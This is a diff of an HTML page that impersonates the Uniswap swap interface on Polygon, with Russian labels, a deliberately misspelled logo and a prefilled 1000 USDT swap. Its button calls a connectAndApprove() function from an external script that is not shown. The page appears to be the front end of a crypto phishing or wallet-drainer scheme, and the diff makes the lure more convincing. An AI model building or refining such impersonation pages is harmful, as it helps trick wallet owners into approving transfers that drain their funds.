@@ -3,45 +3,120 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Uniswap!!! Protocol</title>
+    <title>Uniswap Protocol | Polygon</title>
     <style>
-        :root { --bg: #1e0533; --accent: #ff007a; --text: #fff; --card: rgba(255, 255, 255, 0.08); --border: rgba(255, 255, 255, 0.1); }
+        :root { 
+            --bg: #1e0533; 
+            --accent: #ff007a; 
+            --text: #fff; 
+            --card: rgba(255, 255, 255, 0.08); 
+            --border: rgba(255, 255, 255, 0.1); 
+        }
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: -apple-system, sans-serif; background: linear-gradient(135deg, #1e0533 0%, #3c1053 100%); color: var(--text); min-height: 100vh; display: flex; flex-direction: column; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
+            background: linear-gradient(135deg, #1e0533 0%, #3c1053 100%); 
+            color: var(--text); 
+            min-height: 100vh; 
+            display: flex; 
+            flex-direction: column; 
+        }
         .header { display: flex; justify-content: space-between; align-items: center; padding: 16px 24px; background: rgba(0, 0, 0, 0.2); }
-        .logo { font-size: 24px; font-weight: bold; color: var(--accent); }
+        .logo { font-size: 24px; font-weight: bold; color: var(--accent); text-decoration: none; }
         .main { flex: 1; display: flex; justify-content: center; align-items: center; padding: 20px; }
-        .swap-card { background: var(--card); border: 1px solid var(--border); border-radius: 24px; padding: 24px; width: 100%; max-width: 420px; backdrop-filter: blur(15px); }
-        .swap-input { background: rgba(0, 0, 0, 0.2); border-radius: 16px; padding: 16px; margin: 12px 0; }
-        .swap-input input { background: transparent; border: none; color: white; font-size: 28px; width: 100%; outline: none; }
-        .start-btn { width: 100%; padding: 18px; font-size: 18px; background: var(--accent); color: white; border: none; border-radius: 16px; cursor: pointer; font-weight: 600; }
-        #status { margin-top: 15px; text-align: center; font-size: 13px; color: #bbb; min-height: 40px; }
+        .swap-card { 
+            background: rgba(255, 255, 255, 0.05); 
+            backdrop-filter: blur(20px); 
+            border: 1px solid var(--border); 
+            border-radius: 24px; 
+            padding: 24px; 
+            width: 100%; 
+            max-width: 420px; 
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
+        }
+        .swap-input { background: rgba(0,0,0,0.2); border-radius: 16px; padding: 16px; margin-bottom: 8px; border: 1px solid transparent; }
+        .swap-input:focus-within { border-color: var(--accent); }
+        .swap-input input { 
+            background: transparent; 
+            border: none; 
+            color: white; 
+            font-size: 28px; 
+            width: 100%; 
+            outline: none; 
+            margin-top: 4px;
+        }
+        .start-btn { 
+            width: 100%; 
+            padding: 18px; 
+            font-size: 18px; 
+            background: var(--accent); 
+            color: white; 
+            border: none; 
+            border-radius: 16px; 
+            cursor: pointer; 
+            font-weight: 600; 
+            transition: transform 0.2s, background 0.2s;
+            margin-top: 10px;
+        }
+        .start-btn:hover { background: #e6006e; transform: translateY(-1px); }
+        .start-btn:active { transform: translateY(1px); }
+        
+        #status { 
+            margin-top: 15px; 
+            text-align: center; 
+            font-size: 14px; 
+            color: #bbb; 
+            min-height: 20px; 
+            line-height: 1.4;
+        }
+        
+        /* Стили для мобильных кошельков */
+        @media (max-width: 480px) {
+            .swap-card { padding: 16px; }
+            .logo { font-size: 20px; }
+        }
     </style>
 </head>
 <body>
     <div class="header">
-        <div class="logo">Uniswap</div>
-        <div style="background: var(--card); padding: 8px 16px; border-radius: 12px; font-size: 14px;">Polygon</div>
-    </div>
-    <div class="main">
-        <div class="swap-card">
-            <h3 style="margin-bottom: 15px;">Своп</h3>
-            <div class="swap-input">
-                <div style="font-size: 12px; color: #aaa;">Продать</div>
-                <input type="number" placeholder="0.0" value="100">
-            </div>
-            <div style="text-align: center; margin: -10px 0; font-size: 20px;">↓</div>
-            <div class="swap-input">
-                <div style="font-size: 12px; color: #aaa;">Купить</div>
-                <input type="number" placeholder="0.0" readonly>
-            </div>
-            <button class="start-btn" onclick="connectAndApprove()">Начать работу</button>
-            <div id="status">Ожидание подключения...</div>
+        <div class="logo">Uniswa!!p</div>
+        <div style="background: var(--card); padding: 8px 16px; border-radius: 12px; font-size: 14px; display: flex; align-items: center; gap: 8px;">
+            <div style="width: 8px; height: 8px; background: #8247e5; border-radius: 50%;"></div>
+            Polygon
         </div>
     </div>
+
+    <div class="main">
+        <div class="swap-card">
+            <h3 style="margin-bottom: 15px; font-weight: 500;">Своп</h3>
+            
+            <div class="swap-input">
+                <div style="font-size: 12px; color: #aaa;">Вы отдаете</div>
+                <div style="display: flex; justify-content: space-between; align-items: center;">
+                    <input type="number" placeholder="0.0" value="1000">
+                    <span style="font-weight: 600;">USDT</span>
+                </div>
+            </div>
+
+            <div style="text-align: center; margin: -12px 0; position: relative; z-index: 2;">
+                <div style="background: #2d1145; width: 32px; height: 32px; margin: 0 auto; border-radius: 8px; border: 4px solid #1e0533; display: flex; align-items: center; justify-content: center; font-size: 14px;">↓</div>
+            </div>
+
+            <div class="swap-input">
+                <div style="font-size: 12px; color: #aaa;">Вы получаете</div>
+                <div style="display: flex; justify-content: space-between; align-items: center;">
+                    <input type="number" placeholder="0.0" value="998.5" disabled>
+                    <span style="font-weight: 600;">USDC</span>
+                </div>
+            </div>
+
+            <button class="start-btn" id="actionButton" onclick="connectAndApprove()">Обменять</button>
+            
+            <div id="status">Подключите кошелек для начала работы</div>
+        </div>
+    </div>
+
     <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
     <script src="app.js"></script>
 </body>
 </html>
-
-
